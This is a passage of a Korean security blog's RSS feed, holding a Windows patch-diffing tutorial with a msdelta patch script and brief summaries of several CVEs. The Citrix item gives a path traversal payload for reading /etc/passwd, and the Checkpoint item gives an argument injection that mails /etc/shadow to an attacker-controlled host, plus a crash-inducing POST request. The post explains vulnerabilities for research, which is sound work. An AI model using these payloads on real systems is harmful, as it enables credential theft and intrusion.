-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/node-js/">node.js</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
-      <link>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/</link>
-      <guid>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/</guid>
-      <pubDate>Sun, 29 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! &lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2020/11/15/l</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing 맛보기 Part 1</a></p><p>업데이트 패키지 추출도 했으니 이제 진짜 패치 diffing을 시작…하기 전에! 해야 할게 한 가지 더 남아있습니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>아니 그럼 diffing은 대체 언제 함?</p></blockquote><p>윈도우에서 패치를 할 때 어떤 방식으로 하는지를 먼저 알아봐야 합니다. 그래야 diffing 할 버전 별 바이너리를 생성할 수 있어요 ㅎㅎ</p><h1 id="패치-파일-유형"><a href="#패치-파일-유형" class="headerlink" title="패치 파일 유형"></a>패치 파일 유형</h1><p>이전 글에서 추출한 null, forward, reverse differential에 대해 간단하게 살펴봤었죠. 이 diff 유형의 파일들은 diffing 할 버전별 바이너리를 생성하는 데 아래와 같은 역할을 합니다.</p><ul><li><p>Forward diff</p><ul><li>기본 바이너리 (.1)를 특정 패치 수준까지 가져옵니다.</li></ul></li><li><p>Reverse diff</p><ul><li>패치가 적용된 바이너리를 기본 바이너리 (.1)로 롤백합니다.</li></ul></li><li><p>NULL diff</p><ul><li><p>패치에서 새 파일이 추가될 경우 사용됩니다.</p></br></li></ul></li></ul><p>diff 파일을 이용한 Windows의 패치 과정입니다. </p><ol><li>기존 바이너리 버전에 맞는 reverse diff 파일로 델타 패치해 기본 버전으로 롤백</li><li>패치 패키지에서 추출한 forward diff 파일로 델타 패치</li></ol><ul><li><p>NULL diff일 경우 패치할 경로에 복사</p></br></li></ul><p>우리가 diffing 할 바이너리를 구하는 과정은 다음과 같습니다.</p><ol><li><code>C:\system32\WinSxS</code> 에서 diffing 할 바이너리를 찾습니다. WinSxS에는 diff 파일뿐만 아니라 해당 버전의 바이너리도 함께 들어있습니다.</li><li>해당 버전의 reverse diff로 델타 패치해 기본 버전 바이너리로 롤백합니다.</li><li>추출한 패치 파일에서 패치할 버전의 forward diff로 델타 패치를 합니다.</li><li>패치된 바이너리의 hash를 구하고 manifest hash와 비교해 정상적으로 패치되었는지 확인합니다.</li></ol><h1 id="패치-적용"><a href="#패치-적용" class="headerlink" title="패치 적용"></a>패치 적용</h1><p><code>ntoskrnl.exe</code> 의 버전 별 바이너리를 생성해서 diffing 해보도록 하겠습니다!</p><p>diffing 대상 선정은 취약점 정보와 해당 취약점의 패치 릴리즈 버전을 보고 판단하면 되겠습니다.</p><p>powershell에서 다음 명령어를 입력하면 WinSxS에 업데이트된 버전별 differential 파일들을 확인할 수 있습니다.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>환경마다 누적된 업데이트가 달라서 결과는 다를 수 있습니다.  현재 제 윈도우 시스템의 <code>ntoskrnl.exe</code> 버전인 10.0.18362.1082를 기준으로 진행해 볼게요.</p><p>현재 ntoskrnl.exe 버전 - 10.0.18362.1082</p><p>추출한 ntoskrnl.exe 버전 - 10.0.18362.1016</p><p>1082 버전은 제 시스템에 이미 있으니 1016 버전을 델타 패치로 생성해보겠습니다!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff 패치에는 ms에서 지원하는 patch API인 <code>msdelta.dll</code> 를 사용합니다.</p><p>Vista 이상 Windows에서는 <code>msdelta.dll</code> 이 기본적으로 내장되어 있기 때문에 가져다가 쓰기만 하면 되죠 ㅎㅎ</p><p>아래는 파이썬을 사용해 작성한 msdelta 패치 스크립트입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>옵션 별 기능은 다음과 같습니다.</p><p>-i :  reverse 또는 forward differential 패치 할 바이너리 지정</p><p>-n : null differential</p><p>-o : 패치 된 결과 파일 생성</p><p>-p : 패치 diff파일 지정</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 버전의 <code>ntoskrnl.exe</code>를 같은 버전의 reverse diff 파일로 패치해 기본 버전으로 롤백한 결과입니다.</p><p>사진과 같이 successfully applied 메시지와 hash 값이 뜨면 패치가 정상적으로 이루어진 것을 확인할 있어요.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>속성에서 확인해 보면 10.0.18362.1 기본 버전으로 롤백이 잘 됐네요!</p><p>이제 우리가 업데이트 패키지에서 추출한 <code>ntoskrnl</code>의 1016버전 forward diff로 패치를 해보겠습니다</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>버전은 1016으로 잘 올라간 것 같군요. hash도 비교해보죠.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNK의 ntoskrnl manifest에서 참고한 hash도 일치하네요! 이로써 패치 스크립트로 정상적으로 패치 된 것을 확인할 수 있습니다.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(글을 쓰고 있는 지금 내 상태)</p><p>바이너리 패치가 이렇게 힘들 일인가..? 격하게 아무것도 안하고 싶어졌지만 기왕 쓰기 시작한 거 끝은 봐야 하지 않겠습니까 으아악 빨리 끝내고 술 먹으러 가야지</p><p>마지막! diffing tool과 분석 방법입니다.</p><p>Diffing은 IDA에서 진행하며 BinDiff라는 플러그인을 사용합니다.  BinDiff는 무료로 배포되는 코드 분석 IDA 플러그인입니다. 유명한 만큼 성능 하나는 확실한 친구죠?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiff는 아래 링크에서 설치할 수 있습니다.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)에서 진행했습니다.</p></blockquote><p>IDA가 설치된 경로를 입력하고 설치하면 되며 정상적으로 설치가 되었다면 IDA의 Edit → Plugins에서 BinDiff를 보실 수 있습니다.</p><p>우선 1016, 1082를 각각 을 열고 Edit→Plugins→BinExport10을 실행합니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>그리고 BinExport v2 Binary Export로 각각 Export 해주면 준비는 끝!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>이제 BinDiff를 실행해서 Workspace를 만들고 Diff→New Diff에서 Export 한 두 바이너리를 선택합니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Export한 파일을 선택하고 Diff하면..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>이렇게 Overview를 볼 수 있습니다. Similarity는 유사도를 나타내는데, 1에 가까울수록 차이가 없다는 뜻입니다.</p></br><p>아래로 내려보면 Similarity가 낮은 항목을 볼 수 있는데, 이 중 한 항목을 우클릭→Open Flow Graph를 실행하면</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>이렇게 그래프로 보여줍니다.  각 노드 색별 의미는 다음과 같습니다.</p><p>초록색 - 변경점 없음</p><p>노란색 - 변경점 있음</p><p>빨간색  - 패치에 의해 제거됨</p><p>회색 - 패치에 의해 추가됨</p><p>좀 더 자세히 볼까요? 보려는 노드를 선택해보겠습니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>이렇게 어셈블리 코드까지 볼 수 있습니다. 이런 방식으로 변경점을 트레이싱하면 어떤 부분이 패치되었는지 자세히 볼 수 있겠죠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>패치 스크립트를 만들어 뒀으니 원데이 분석할 때 유용하게 쓸 수 있을 것 같네요 ㅎㅎ 이제 취약점.. 취약점만 찾으면 되는데….</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>아마 안될거야..</p></blockquote><p>다음엔 다른 주제로 찾아오겠습니다. 조금만 놀구요 ㅎ (<em>망할 코로나 얼른 꺼져줬으면 ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/patch-tuesday/">patch tuesday</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/patch-extract/">patch extract</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
-      <link>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</link>
-      <guid>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/</guid>
-      <pubDate>Sat, 28 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.angelystor.com/2020/09/cve-2020-16602-remote-</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/razer/">razer</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/chroma/">chroma</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/28/fabu1ous/2020-11-28/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
-      <link>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</link>
-      <guid>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/</guid>
-      <pubDate>Fri, 27 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/path-traversal-on-citrix-xen</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/27/l0ch/2020-11-27/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
-      <link>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</link>
-      <guid>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/</guid>
-      <pubDate>Thu, 26 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/vulnerabilities-in-checkpoin</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/argument-injection/">argument injection</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/checkpoint/">checkpoint</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/11/26/idioth/2020-11-26/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] Outlook Mail based Persistence access</title>
-      <link>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</link>
-      <guid>https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/</guid>
-      <pubDate>Wed, 25 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
